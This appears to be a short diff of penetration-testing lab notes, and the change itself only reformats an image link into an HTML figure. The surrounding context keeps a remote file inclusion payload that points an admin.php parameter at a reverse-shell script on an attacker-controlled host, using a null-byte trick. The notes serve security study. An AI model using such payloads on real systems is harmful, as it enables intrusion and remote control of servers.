@@ -48,7 +48,9 @@
 http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://192.168.119.123/php_reverse_shell.php%00
 ```
 
-* ![image](https://user-images.githubusercontent.com/75596877/133100040-9f4a1a6a-1b86-4955-9c4d-651d59e51b31.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/133100040-9f4a1a6a-1b86-4955-9c4d-651d59e51b31.png" alt=""><figcaption></figcaption></figure>
 * Can you now get RCE via RFI?
 
 ```
